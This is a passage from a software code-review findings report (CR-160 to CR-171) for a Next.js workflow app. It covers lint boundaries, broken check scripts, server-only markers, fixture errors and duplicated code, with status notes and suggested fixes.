- **Suggested fix:** Move one `deleteFlowCascade(db, flowId)` into `scripts/lib/seed-db.mjs` that mirrors `FLOW_CHILD_TABLES` in order, children first, and handles `parent_flow_id` children as the fanout script does. Use it from all four seeds. Add a comment in `flow.ts` pointing to it, or add a test asserting the lists match.
- **Effort:** S

### CR-160 [Medium] Every `scripts/check-*.ts` and `cursor-usage.ts` is unrunnable as documented

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 05](review-tasks/05-test-coverage-baseline.md)
- **Current location:** scripts/check-branch-refine.ts:4, scripts/check-worktrees.ts:12, scripts/check-plan-turn-output.ts:4, scripts/cursor-usage.ts:7-8, scripts/check-prompt-splits.ts:3, scripts/check-prompt-assembly.ts:10, package.json:5-12
- **Re-verification note:** vitest now exists with a `server-only` stub (`tests/server-only-stub.ts`) and 23 passing test files, so the runner prerequisite is done. The check scripts are still not ported: `check-branch-refine` still documents `node --experimental-strip-types` (verified: ERR_MODULE_NOT_FOUND), `check-worktrees`, `check-plan-turn-output` and `cursor-usage` still use `npx tsx` (not installed), and none are wired into `package.json`. Remaining: port the checks into `*.test.ts` under vitest and delete the scripts that have no purpose left.

- **Severity:** Medium
- **Category:** Code quality
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-07
- **Related:** CR-041 (NODE-43, DATA-25, TOOL-03) — fix CR-041 first: port the check scripts into the new test runner; CR-165 (TOOL-12)
- **Location:** `scripts/check-branch-refine.ts:4-7`, `scripts/check-prompt-splits.ts:11`, `scripts/check-prompt-assembly.ts:15`, `scripts/check-worktrees.ts:12-32`, `scripts/cursor-usage.ts:7,18-19`
- **Problem:** The documented run commands are `node --experimental-strip-types ...` and `npx tsx ...`. Neither works:
  1. Native strip-types needs explicit `.ts` extensions, but all imports are extensionless (verified by running the pure `check-prompt-splits.ts`).
  2. `tsx` is not a dependency.
  3. Every script except `check-prompt-splits` transitively imports a module with `import "server-only"` (`lib/git/*`, `lib/db`, `credentials.ts`). `server-only` is not installed, because Next aliases it internally (`next/dist/build/create-compiler-aliases.js:186`). Even if installed, it throws outside the `react-server` condition.

  None of the scripts is wired into `package.json`. These are the repo's only regression checks, and they are dead.
- **Evidence:**
  ```
  $ node --experimental-strip-types scripts/check-prompt-splits.ts
  Error [ERR_MODULE_NOT_FOUND]: Cannot find module '/Users/mihir.shah/ship/lib/engine/prompt-defaults'
  $ ls node_modules/tsx node_modules/server-only -> No such file or directory
  lib/git/worktrees.ts / lib/db/index.ts: import "server-only"
  ```
- **Suggested fix:** Fold these into the test runner from TOOL-03 (CR-041) (vitest with a `server-only` stub alias). Or add `tsx` (needs approval) plus `--conditions=react-server`, and add `check:*` scripts to `package.json`. Delete any check that no longer has a purpose.
- **Effort:** M

### CR-161 [Medium] The client `lib/` import guard skips `hooks/`, `types/` and `constants/`; live violations in `hooks/use-highlighted-code.ts` and `types/start-contract.ts`

- **Status at `abaa007`:** **Fixed** (Task 04 — extended ESLint client boundary, moved highlighter + start contract + `LintProblem`)
- **Category:** Boundaries
- **Area:** Area 7b — Tooling & config; Area 5 — Flow runtime UI; Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** TOOL-08, FLOWUI-16, UI-27 (merged duplicate)
- **Related:** CR-039 (NODE-44, TOOL-01) — fix CR-039 first: the extended rule only takes effect once lint runs; CR-165 (TOOL-12); CR-229 (FLOWUI-21)
- **Location:**
  - TOOL-08: `eslint.config.mjs:107-108`, `hooks/use-highlighted-code.ts:3`, `lib/highlighter.tsx:1-7`, `types/start-contract.ts:13-17`
  - FLOWUI-16: `hooks/use-highlighted-code.ts:3`, `eslint.config.mjs:106-107` (the rule's `files` covers only `app/**` and `components/**`)
  - UI-27: `types/start-contract.ts:13-17`, `types/template-lint.ts:7`
- **Suggested fix (combined):** Extend the `no-restricted-imports` block in `eslint.config.mjs` to `hooks/**`, `constants/**` and `types/**` (type-only imports allowed for `types/`). Move `lib/highlighter.tsx` to a client-safe location (or allowlist it after verifying it is pure). For `types/start-contract.ts`, either allowlist `lib/engine/nodes/start/contract.ts` explicitly or move the pure schema to a client-safe shared module; define `LintProblem` in `types/` so `types/template-lint.ts` no longer points at the db-importing `context-lint.ts`.
- **Effort:** S (sources: TOOL-08 S, FLOWUI-16 S, UI-27 S)

Original findings, verbatim:

#### TOOL-08 (Area 7b — Tooling & config): `hooks/`, `types/` and `constants/` are outside the client `lib/` import boundary, and there is a live violation in `hooks/use-highlighted-code.ts`

- **Severity:** Medium
- **Category:** Boundaries
- **Location:** `eslint.config.mjs:107-108`, `hooks/use-highlighted-code.ts:3`, `lib/highlighter.tsx:1-7`, `types/start-contract.ts:13-17`
- **Problem:** The "lib/ is server-only" `no-restricted-imports` rule targets only `app/**` and `components/**`. Shared client hooks (`hooks/`), `types/` and `constants/` are unchecked. In practice `hooks/use-highlighted-code.ts` (shared client hook) imports `@/lib/highlighter`, a client-side React/shiki module living in `lib/` and not in the allowlist. This violates AGENTS.md §2.1 ("Never import anything from lib/ into a client component"). `types/start-contract.ts` also re-exports a runtime value (`parseStartContract`) from `lib/engine/nodes/start/contract`. It is pure today, but nothing stops a future server import there from leaking into the 7 client files that consume it.
- **Evidence:**
  ```
  eslint.config.mjs:107  files: ["app/**/*.{ts,tsx}", "components/**/*.{ts,tsx}"],
  hooks/use-highlighted-code.ts:3  import { loadHighlighter } from "@/lib/highlighter"
  types/start-contract.ts:17  export { parseStartContract } from "@/lib/engine/nodes/start/contract";
  ```
- **Suggested fix:** Extend `files` to `["app/**/*.{ts,tsx}", "components/**/*.{ts,tsx}", "hooks/**/*.{ts,tsx}", "constants/**/*.ts"]`. Move `lib/highlighter.tsx` to `components/shared/` or `hooks/` (it is client UI code). For `types/`, allow only type-only imports from `lib/` (`@typescript-eslint/no-restricted-imports` with `allowTypeImports: true`), and allowlist `lib/engine/nodes/start/contract` explicitly so the seam is visible.
- **Effort:** S

#### FLOWUI-16 (Area 5 — Flow runtime UI): `hooks/` is outside the `lib/` import guard; `use-highlighted-code` imports a non-allowlisted lib module

- **Severity:** Medium
- **Category:** Boundaries
- **Location:** `hooks/use-highlighted-code.ts:3`, `eslint.config.mjs:106-107` (the rule's `files` covers only `app/**` and `components/**`)
- **Problem:** Shared client hooks in `hooks/` aren't covered by the `no-restricted-imports` lib allowlist (utils, modelSpec, format, usage, groupEvents). `use-highlighted-code` imports `@/lib/highlighter`, which isn't allowlisted, and it's pulled into the client bundle through `components/shared/Markdown.tsx`. It happens to be client-safe today (shiki), but nothing stops a future `hooks/*` file from importing `lib/db` and leaking better-sqlite3 into a client bundle.
- **Evidence:**
  ```ts
  // hooks/use-highlighted-code.ts
  import { loadHighlighter } from "@/lib/highlighter"
  // eslint.config.mjs
  files: ["app/**/*.{ts,tsx}", "components/**/*.{ts,tsx}"],
  ```
- **Suggested fix:** Add `hooks/**/*.{ts,tsx}` to that rule block. Then either move `lib/highlighter.tsx` to a client-safe home (for example `components/shared/highlighter.tsx` or a `utils/` folder) or add it to the documented allowlist after verifying it's pure.
- **Effort:** S

#### UI-27 (Area 7a — Settings, tasks, shared UI, constants, types): `types/start-contract.ts` re-exports a runtime value from `lib/engine` into client bundles

- **Severity:** Low
- **Category:** Boundaries
- **Location:** `types/start-contract.ts:13-17`, `types/template-lint.ts:7`
- **Problem:** `parseStartContract` is a value export (zod runtime) from `lib/engine/nodes/start/contract.ts`. That module isn't on the client allowlist (utils, format, modelSpec, usage, groupEvents) and has no guard, so an engine import added there later would silently ship to the client (`components/flows/panels/StartView.tsx`, `components/template-editor/*`). `types/template-lint.ts` is type-only but targets `lib/engine/context-lint.ts`, which imports `db`. That's safe only while it stays `export type`, and `types/` otherwise claims "no imports from lib/".
- **Evidence:**
  ```ts
  export { parseStartContract } from "@/lib/engine/nodes/start/contract";
  export type { LintProblem } from "@/lib/engine/context-lint";
  ```
- **Suggested fix:** Either add `lib/engine/nodes/start/contract.ts` to the documented allowlist and the `no-restricted-paths` config, or move the pure schema to a client-safe `lib/shared/start-contract.ts` (or similar) that both sides import. Define `LintProblem` in `types/` and have `context-lint.ts` import it from there.
- **Effort:** S

### CR-162 [Medium] AGENTS.md §5 rules are downgraded to `warn` for `lib/**` and `scripts/**`, which hides 56 `any` and about 30 `!`

- **Status at `abaa007`:** **Fixed** (Task 03 — frozen offender list, `--max-warnings`, `reportUnusedDisableDirectives`, typed `no-floating-promises` on `lib/**`)

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-09
- **Related:** CR-039 (NODE-44, TOOL-01) — fix CR-039 first: lint must run before rule severities matter
- **Location:** `eslint.config.mjs:35-55`
- **Problem:** AGENTS.md §4 and §5 require `no-explicit-any`, `no-non-null-assertion` and `exhaustive-deps` as errors with no `!` on possibly-missing data. The override sets all three to `warn` for backend and scripts, so `npm run lint` passes with violations. Grep counts: 43 `any` in 13 `lib/` files (top: `lib/db/index.ts` 14, `lib/engine/poller.ts` 7) and 13 in `scripts/`. About 30 `!` assertions in `lib/` (e.g. `lib/db/index.ts:955 return this.repoById(input.id)!;`). The justification comment cites "AGENTS.md section 6 (Phase 6 final state)", but AGENTS.md has only sections 0-5, so the reference is stale. The glob `lib/**/*.ts` also misses `lib/highlighter.tsx`.
- **Evidence:**
  ```
  eslint.config.mjs:35  // AGENTS.md section 6 (Phase 6 final state): these run at error level in
  eslint.config.mjs:50  files: ["lib/**/*.ts", "scripts/**/*.{ts,mjs}"],
  eslint.config.mjs:53  "@typescript-eslint/no-explicit-any": "warn",
  eslint.config.mjs:54  "@typescript-eslint/no-non-null-assertion": "warn",
  ```
- **Suggested fix:** Keep `warn` only for a frozen per-file list of current offenders, not a whole-tree glob, so new `lib/` files get `error`. Track burn-down. Add `--max-warnings=0` to `lint` once the list exists. Fix the stale "section 6" reference.
- **Effort:** M

### CR-163 [Medium] Two inline `react-hooks/exhaustive-deps` suppressions in the template editor, and lint does not block inline disables

- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
- **Current location:** components/template-editor/components/BuilderApiBridge.tsx:14-19, components/template-editor/hooks/use-output-schema-draft.ts:44-69, components/template-editor/components/BuilderFlow.tsx:207, eslint.config.mjs:18-193
- **Re-verification note:** Both inline `eslint-disable-next-line react-hooks/exhaustive-deps` suppressions remain, and the config has no `linterOptions.reportUnusedDisableDirectives` and no guard against disabling the rule. `BuilderFlow` still wraps `onApi` in an inline lambda, so it is never stable. Fix: make `onApi` stable (`useCallback` in EditorPage, passed straight through) and list it, move output-schema parsing into the change handler, and add `reportUnusedDisableDirectives: "error"` plus a disable-ban (the plugin is a new dep and needs approval).

- **Severity:** Medium
- **Category:** Boundaries (sources: TOOL-10: Boundaries; TPL-23: Code quality)
- **Area:** Area 7b — Tooling & config; Area 6 — Template authoring
- **Source:** TOOL-10, TPL-23 (merged duplicate)
- **Related:** CR-033 (TPL-05) — fix CR-033 first: the output-schema effect fix is shared; CR-039 (NODE-44, TOOL-01) — fix CR-039 first: the new lint option only takes effect once lint runs; CR-145 (TPL-20)
- **Location:**
  - TOOL-10: `components/template-editor/components/BuilderApiBridge.tsx:18`, `components/template-editor/hooks/use-output-schema-draft.ts:68`, `eslint.config.mjs` (no `linterOptions`)
  - TPL-23: `components/template-editor/components/BuilderApiBridge.tsx:18`, `components/template-editor/hooks/use-output-schema-draft.ts:68`
- **Suggested fix (combined):** Fix the two call sites first (TPL-23: make the page's `onApi` a stable `useCallback`/ref and list it; move `use-output-schema-draft` parsing into the change handler as in TPL-05 (CR-033)), then add `linterOptions.reportUnusedDisableDirectives: "error"` and a rule that forbids disabling `react-hooks/exhaustive-deps` (TOOL-10; the `eslint-comments` plugin is a new dep and needs approval).
- **Effort:** S (sources: TOOL-10 S, TPL-23 S)

Original findings, verbatim:

#### TOOL-10 (Area 7b — Tooling & config): Inline `eslint-disable` of `exhaustive-deps` is not blocked (2 live suppressions)

- **Severity:** Medium
- **Category:** Boundaries
- **Location:** `components/template-editor/components/BuilderApiBridge.tsx:18`, `components/template-editor/hooks/use-output-schema-draft.ts:68`, `eslint.config.mjs` (no `linterOptions`)
- **Problem:** AGENTS.md §2.6 says "Never suppress exhaustive-deps." The config allows inline disables, and two exist in touched-area client code. AGENTS.md §5 wants lint to fail instead of relying on prose.
- **Evidence:**
  ```
  BuilderApiBridge.tsx:18          // eslint-disable-next-line react-hooks/exhaustive-deps
  use-output-schema-draft.ts:68    // eslint-disable-next-line react-hooks/exhaustive-deps
  ```
- **Suggested fix:** Add `linterOptions: { reportUnusedDisableDirectives: "error" }`, and use `eslint-plugin-eslint-comments` `no-restricted-disable` (new dep, ask) or a `no-restricted-syntax`-style comment check to forbid disabling `react-hooks/exhaustive-deps`. Fix the two call sites: use a ref for `onApi`, and derive or add the missing deps (owned by the template-editor area).
- **Effort:** S

#### TPL-23 (Area 6 — Template authoring): Suppressed `react-hooks/exhaustive-deps`

- **Severity:** Low
- **Category:** Code quality
- **Location:** `components/template-editor/components/BuilderApiBridge.tsx:18`, `components/template-editor/hooks/use-output-schema-draft.ts:68`
- **Problem:** AGENTS.md §2.6 says never suppress `exhaustive-deps`. BuilderApiBridge omits `onApi` because the page passes an inline lambda (the root cause is TPL-20 (CR-145)). `use-output-schema-draft` omits deps from the `[text]` effect that parses and emits the schema, the same effect-driven emission as TPL-05 (CR-033).
- **Evidence:**
  ```ts
    onApi({ screenToFlowPosition, fitView });
    // onApi is deliberately excluded: the page's handler is an inline lambda ...
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [screenToFlowPosition, fitView]);
  ```
- **Suggested fix:** Make the page's `onApi` a stable `useCallback` and list it as a dependency. For `use-output-schema-draft`, move parsing and emitting into the change handler (see TPL-05 (CR-033)).
- **Effort:** S

### CR-164 [Medium] `docs/flow-templates/review-notes.yaml` uses an invalid `wait_for` and a non-existent output field

- **Status at `abaa007`:** **Open**, fix in [Task 05](review-tasks/05-test-coverage-baseline.md)
- **Current location:** docs/flow-templates/review-notes.yaml:23, docs/flow-templates/review-notes.yaml:33, lib/engine/templates/template-store.ts:957-968, lib/engine/constants/triggers.ts:26, lib/engine/nodes/kinds/review/schema.ts:18
- **Re-verification note:** The fixture still uses `wait_for: gitlab_pipeline`, which is not in `WAIT_FOR_SOURCES`, so `nodeTrigger()` still silently drops it and the pipeline node loses its gate. It also still references `nodes.review.output.comment_count`, but the review node publishes `comments`. Nothing imports the docs fixtures in tests. Fix: change these to `pipeline` and `.comments`, make `nodeTrigger`/validation reject unknown `wait_for` and trigger types with a lint error, and add a vitest that imports every `docs/flow-templates/*.yaml`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-11
- **Status:** Needs verification
  - TOOL-11: "Needs verification of the exact runtime rendering."
- **Related:** CR-041 (NODE-43, DATA-25, TOOL-03) — fix CR-041 first: the import-every-fixture test lives in the new runner; CR-063 (ENG-18); CR-263 (TOOL-20)
- **Location:** `docs/flow-templates/review-notes.yaml:23`, `docs/flow-templates/review-notes.yaml:33`; `lib/engine/templates.ts:38`, `lib/engine/templates.ts:1022`, `lib/engine/templates.ts:245-259`; `lib/engine/nodes/review/schema.ts:17-20`
- **Problem:**
  1. `wait_for: gitlab_pipeline` is not in `WAIT_FOR_SOURCES` (`pipeline|comments|webhook|timer`). `nodeTrigger()` silently drops it on import, so the pipeline node has no `wait_for`. `waitNodeKey(flowId, "pipeline")` and `chainNodeKeys()` then find no gate: the poller and webhook can't route pipeline events, and the whole graph is treated as the chain.
  2. `{{nodes.review.output.comment_count}}`: the review node publishes `comments`. The lint free-passes built-ins (contract `null`), so the import succeeds and the prompt renders an empty value. Needs verification of the exact runtime rendering.
- **Evidence:**
  ```
  review-notes.yaml:23   wait_for: gitlab_pipeline
  templates.ts:38        export const WAIT_FOR_SOURCES = ["pipeline", "comments", "webhook", "timer"] as const;
  templates.ts:1022      if (typeof rec.wait_for === "string" && (WAIT_FOR_SOURCES ...).includes(rec.wait_for)) {
  review/schema.ts:17    export const ReviewOutput = z.object({ comments: z.number(), ...
  ```
- **Suggested fix:** Change to `wait_for: pipeline` and `{{nodes.review.output.comments}}`. Make `nodeTrigger()` or `validated()` reject unknown `wait_for` and trigger types with a lint error instead of silently dropping them. Add the "import every fixture" test from TOOL-03 (CR-041).
- **Effort:** S

### CR-165 [Medium] `server-only` is neither a declared dependency nor lint-enforced; 9 `lib/` modules with db/fs/child_process imports lack it

- **Status at `abaa007`:** **Fixed** (Task 04 — `server-only` dependency, marker on all non-allowlisted `lib/` modules, `tests/server-only-policy.test.ts`)

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-12
- **Related:** CR-039 (NODE-44, TOOL-01) — fix CR-039 first: lint enforcement of `server-only` depends on lint running; CR-041 (NODE-43, DATA-25, TOOL-03); CR-160 (TOOL-07); CR-161 (FLOWUI-16, UI-27, TOOL-08)
- **Location:** `package.json:20-54`; `lib/engine/flow.ts:1`, `lib/engine/poller.ts:1`, `lib/engine/reconcile.ts:1`, `lib/engine/step-flows.ts:1`, `lib/engine/context-lint.ts:1`, `lib/engine/templates.ts:1`, `lib/engine/merge-arena.ts:1-3`, `lib/engine/nodes/base/flow-context.ts:1-3`, `lib/engine/nodes/script/script-node.ts:1-3`
- **Problem:** AGENTS.md §2.1 says server-only modules start with `import "server-only"`. Only 35 of 93 `lib/*.ts` files do. The listed 9 import `../db`, `fs` or `child_process` directly with no marker. The lint rule (TOOL-08 (CR-161)) is the only guard, and it can't run (TOOL-01 (CR-039)). The package itself isn't in `package.json`; it resolves only through Next's internal webpack alias, which is why scripts and future tests can't load `lib/` (TOOL-07 (CR-160)).
- **Evidence:**
  ```
  with server-only: 35 / total lib ts: 93
  lib/engine/merge-arena.ts:1   import { execFile } from "child_process";
  lib/engine/flow.ts:1          import { db } from "../db";
  next/dist/build/create-compiler-aliases.js:186  'server-only$': 'next/dist/compiled/server-only/empty',
  ```
- **Suggested fix:** Add `server-only` as an explicit dependency (ask first). Add `import "server-only"` to the 9 files, and eventually to every `lib/` module outside the client allowlist. Optionally add a custom lint check or a test that greps `lib/**` (minus the allowlist) for the marker.
- **Effort:** S

### CR-166 [Medium] The settings barrel omits `SettingsProvider`/`useSettings`, forcing deep imports that the partial cross-feature barrel lint rule lets through

- **Status at `abaa007`:** **Fixed** (Task 04 — settings barrel exports, generic feature barrel ESLint rule)

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 7b — Tooling & config; Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** TOOL-13, UI-18 (merged duplicate)
- **Related:** CR-039 (NODE-44, TOOL-01) — fix CR-039 first: the barrel rule only takes effect once lint runs
- **Location:**
  - TOOL-13: `eslint.config.mjs:130-150`; `app/(workspace)/settings/page.tsx:3`, `app/(workspace)/settings/layout.tsx:1`, `app/(workspace)/settings/integrations/page.tsx:4`, `app/(workspace)/settings/repositories/page.tsx:3`
  - UI-18: `components/settings/index.ts:7-8`
- **Suggested fix (combined):** Export `SettingsProvider`, `useSettings` and the section components from `components/settings/index.ts` and switch the four `app/(workspace)/settings/**` imports (and the absolute self-imports in `settings/repos/*`) to the barrel (UI-18). Then replace the per-feature barrel patterns in `eslint.config.mjs` with a generic deep-import pattern plus exceptions, and drop the dead `components/panels` entry (TOOL-13).
- **Effort:** S (sources: TOOL-13 S, UI-18 S)

Original findings, verbatim:

#### TOOL-13 (Area 7b — Tooling & config): Cross-feature barrel enforcement is partial: `settings/context` deep imports pass, the `panels` pattern is dead, and 5 features are unguarded

- **Severity:** Medium
- **Category:** Boundaries
- **Location:** `eslint.config.mjs:130-150`; `app/(workspace)/settings/page.tsx:3`, `app/(workspace)/settings/layout.tsx:1`, `app/(workspace)/settings/integrations/page.tsx:4`, `app/(workspace)/settings/repositories/page.tsx:3`
- **Problem:** The settings patterns block only 2+ segments (`settings/*/*`). Single-file internals like `@/components/settings/context` bypass the `components/settings/index.ts` barrel, which does not export `useSettings` or `SettingsProvider`; there are 4 such imports. The `@/components/panels/!(index.tsx)` pattern targets a directory that no longer exists (panels are now `components/flows/panels`). `flows`, `chat`, `builder`, `tasks` and `templates` have barrels but no rule. Grep finds no current deep imports for those five, but nothing prevents them.
- **Evidence:**
  ```
  app/(workspace)/settings/layout.tsx:1  import { SettingsProvider } from "@/components/settings/context";
  eslint.config.mjs:131  group: ["@/components/panels/!(index.tsx)"],
  $ ls components/panels -> No such file or directory
  ```
- **Suggested fix:** Replace the per-feature list with a generic pattern such as `@/components/*/*` (deep), plus exceptions for `@/components/ui/*` and the settings per-domain barrels (`@/components/settings/{repos,general,integrations}`). Export `SettingsProvider` and `useSettings` from a settings barrel and update the 4 imports. Drop the dead `panels` entry.
- **Effort:** S

#### UI-18 (Area 7a — Settings, tasks, shared UI, constants, types): Settings barrel omits the provider and hook, forcing deep imports of `settings/context`

- **Severity:** Low
- **Category:** Boundaries
- **Location:** `components/settings/index.ts:7-8`
- **Problem:** The barrel exports only fetchers and three types, so the app routes deep-import `@/components/settings/context` for `SettingsProvider` / `useSettings`, against §2.3's "never deep-import across features". The importers are `app/(workspace)/settings/layout.tsx:1`, `page.tsx:3`, `integrations/page.tsx:4` and `repositories/page.tsx:3`. Inside the feature, `repos/*` also imports `@/components/settings/context` by absolute path, while sibling folders use relative `../context`.
- **Evidence:**
  ```ts
  export { fetchSettings, fetchRepos } from "./queries";
  export type { Repo, Harness, HarnessMode } from "./context";
  ```
- **Suggested fix:** Export `SettingsProvider`, `useSettings`, `GeneralSection`, `ReposSection` and the integration tabs from `components/settings/index.ts`, and switch the app routes to `@/components/settings`. The route files are outside this area, so coordinate that part.
- **Effort:** S

## Findings: Low (102)

### CR-167 [Low] The four repo routes duplicate their input helpers, and `~` expansion is wrong

- **Status at `abaa007`:** **Fixed** ([Task 11](review-tasks/11-api-input-validation-settings.md) — `lib/schemas/repo.ts`, `RepoService`, shared path/`~` rules)

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-20
- **Location:** `app/api/repos/route.ts:8-26`, `app/api/repos/[id]/route.ts:9-20,27-30`, `app/api/repos/test-setup/route.ts:10-25`, `app/api/repos/detect/route.ts:8-12`
- **Problem:** The `~` expansion, `optString` and `optTimeoutMs` are copied into each file, in slightly different variants (keep-on-absent versus null-on-absent). `validateLocalPath` (`repos/route.ts:8`) does no validation. `path.join(HOME, p.slice(1))` turns `~bob/x` into `$HOME/bob/x` instead of rejecting it. The `.git` existence check is also duplicated (`repos/route.ts:42`, `repos/[id]/route.ts:31`).
- **Evidence:**
  ```ts
  const expanded = p.startsWith("~") ? path.join(process.env.HOME ?? "", p.slice(1)) : p;
  ```
- **Suggested fix:** Put a single Zod schema for the repo input, with transforms for `~` (only `~` or `~/`), the timeout and the string fields, in `lib/schemas/repo.ts`. Move the path checks into a `RepoService`.
- **Effort:** S

### CR-168 [Low] Loaders and routes build the same payloads separately, and one copy has already drifted

- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
- **Current location:** loaders/tasks.ts:23-24,38-40,49-52; loaders/templates.ts:23-33; app/api/tasks/providers/route.ts:11-19; app/api/settings/route.ts:75-78; app/api/models/route.ts:73-75
- **Re-verification note:** The provider list is still serialized in three places, and `loaders/tasks.ts` still leaves out `contextFields` even though its comment says it matches `GET /api/tasks/providers`. Default-model resolution is duplicated between the settings and models routes, and the `default_execution_mode` read is duplicated between the tasks loader and the settings route. Add `taskRegistry.describe()`, `settingsService.defaultModel()` and `settingsService.defaultExecutionMode()`, and call them from both the loaders and the routes.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-21
- **Location:** `loaders/tasks.ts:23,38-40`, `loaders/templates.ts:23-33`, `app/api/tasks/providers/route.ts:11-19`, `app/api/settings/route.ts:76-78`, `app/api/models/route.ts:73-75`, `loaders/tasks.ts:49-52`
- **Problem:**
  - The provider list is built in three places. `loaders/tasks.ts` claims "the same serialization GET /api/tasks/providers does" but leaves out `contextFields`.
  - The default-model resolution (`normalizeModelSpec(db.getSetting("default_model","") || config.cursor.defaultModel() || "")`) is duplicated between the settings and models routes.
  - The `default_execution_mode` read and its normalization are duplicated between `loaders/tasks.ts` and the settings route.

  The loaders say they share a "single mapping source", but these mappings are copied, not shared.
- **Evidence:**
  ```ts
  /** registered task providers — the same serialization GET /api/tasks/providers does */
  .map((p) => ({ kind: p.kind, label: p.label, configured: p.configured() }));  // no contextFields
  ```
- **Suggested fix:** Add service methods `taskRegistry.describe()`, `settingsService.defaultModel()` and `settingsService.defaultExecutionMode()`, and call them from both the loaders and the routes.
- **Effort:** S

### CR-169 [Low] Domain strings are repeated as literals instead of named constants

- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
- **Current location:** app/api/settings/route.ts:14,44-49,73-88,122-176; app/api/models/route.ts:35,74; loaders/tasks.ts:50-52; app/api/status/route.ts:25,30,46; app/api/webhooks/gitlab/route.ts:49,62,68; app/api/contracts/route.ts:64; app/api/templates/route.ts:21-24; lib/engine/prompts/prompt-preview.ts:99,126; app/api/flows/[id]/action/route.ts:36-85; components/flows/panels/FanoutStepList.tsx:143,149,157 (plus AgentView/HttpView/ScriptView/DecisionView/StartView action calls); app/api/node-templates/route.ts:22-27
- **Re-verification note:** All cited literal groups are still present: settings keys, `cloud`/`local`, SQL `'active'`/`'running'`, wait sources, `"start"`/`"nt_start"`/`"auto"`/`"all"`, action names (a `Record<string, …>` map on the server, raw strings on the client) and the node-kind label map. The only change is that the prompt-template keys moved from the prompt route into `PromptPreview`, still as literals. Reuse `FLOW_STATUS`, `WAIT_FOR_SOURCES`, `nodeRegistry.entryKey()` and `KINDED_NODE_TEMPLATE_KINDS`; add client-safe `SETTINGS_KEYS`, `EXECUTION_MODE` and `FLOW_ACTIONS` constants (type the action map `Record<FlowAction, …>`); and bind SQL status values as parameters.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-22
- **Location:**
  - Settings keys `"default_model"`, `"default_execution_mode"`, `"default_harness"`, `"secrets"`, `"http_allowlist"`, `"local_agent.*"`: `app/api/settings/route.ts:73-88,122-176`, `app/api/models/route.ts:74`, `loaders/tasks.ts:50`.
  - Execution modes `"cloud"`/`"local"`: `settings/route.ts:44,125`, `flows/[id]/prompt/route.ts:77`, `loaders/tasks.ts:50-52`.
  - Status values inside SQL: `'active'` and `'running'` in `app/api/status/route.ts:26,30`; `"running"` in `app/api/webhooks/gitlab/route.ts:68` (the values exist in `constants/flow.ts:FLOW_STATUS`).
  - Wait sources `"comments"`/`"pipeline"` (`WAIT_FOR_SOURCES` exists): `app/api/webhooks/gitlab/route.ts:49,62`.
  - Start node: `"start"` in `app/api/contracts/route.ts:64` (`nodeRegistry.entryKey()` exists); `"start"`, `"nt_start"`, `"auto"`, `"all"` in `app/api/templates/route.ts:21-24`.
  - Template keys `"pipeline_fix"`, `"plan_refine"` and `"plan_subplan_refine"`: `app/api/flows/[id]/prompt/route.ts:48,64,111,166,176-177`.
  - Action names: `app/api/flows/[id]/action/route.ts:37-64`; clients send these as raw strings, for example `components/flows/panels/FanoutStepList.tsx:143`.
  - Node kinds: `app/api/node-templates/route.ts:22-27` (`KINDED_NODE_TEMPLATE_KINDS` exists).
- **Problem:** §2.7 requires named constants. Renaming any of these values breaks the API without a compile error, and the action-name contract between client and server is untyped.
- **Evidence:**
  ```ts
  WHERE f.status = 'active'
  ...
  db.get<{ c: number }>(`SELECT COUNT(*) AS c FROM runs WHERE status = 'running'`)
  ```
- **Suggested fix:** Reuse the existing constants (`FLOW_STATUS`, `WAIT_FOR_SOURCES`, `nodeRegistry.entryKey()`, `KINDED_NODE_TEMPLATE_KINDS`). Add `SETTINGS_KEYS`, `EXECUTION_MODE` and `FLOW_ACTIONS` constants in a client-safe module so the action route's map is typed `Record<FlowAction, …>` and clients import the same names. Bind SQL status values as parameters.
- **Effort:** M

### CR-170 [Low] No DB-touching route declares `runtime = "nodejs"`

- **Status at `abaa007`:** **Fixed** (Task 03 — `export const runtime = "nodejs"` on all 39 routes; `devflow/require-nodejs-runtime` ESLint rule)
- **Current location:** all 39 app/api/**/route.ts files
- **Re-verification note:** Every route now exports `runtime = "nodejs"` alongside `dynamic = "force-dynamic"`. ESLint enforces the export under `app/api/**/route.ts`.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-23
- **Related:** CR-039 (NODE-44, TOOL-01) — fix CR-039 first: the suggested lint rule depends on lint running
- **Location:** All 39 route files under `app/api/**`. Only `dynamic = "force-dynamic"` is exported, for example `app/api/flows/route.ts:5`.
- **Problem:** §3.3 requires DB routes to use the Node runtime. Today they rely on Next's default, which is nodejs. Nothing stops a future `export const runtime = "edge"`, or a segment-level config, from moving a better-sqlite3 route to Edge, where it would only fail at build or run time.
- **Evidence:**
  ```ts
  export const dynamic = "force-dynamic";   // no `export const runtime = "nodejs"`
  ```
- **Suggested fix:** Add `export const runtime = "nodejs";` to every route that touches the DB, or set it once in a shared `app/api/layout`-level config if one is adopted. Enforce it with a lint rule.
- **Effort:** S

### CR-171 [Low] The artifact GET crashes with a 500 on malformed `meta` JSON

- **Status at `abaa007`:** **Open**, fix in [Task 34](review-tasks/34-db-row-safety.md)
- **Current location:** app/api/artifacts/[id]/route.ts:8,12-14
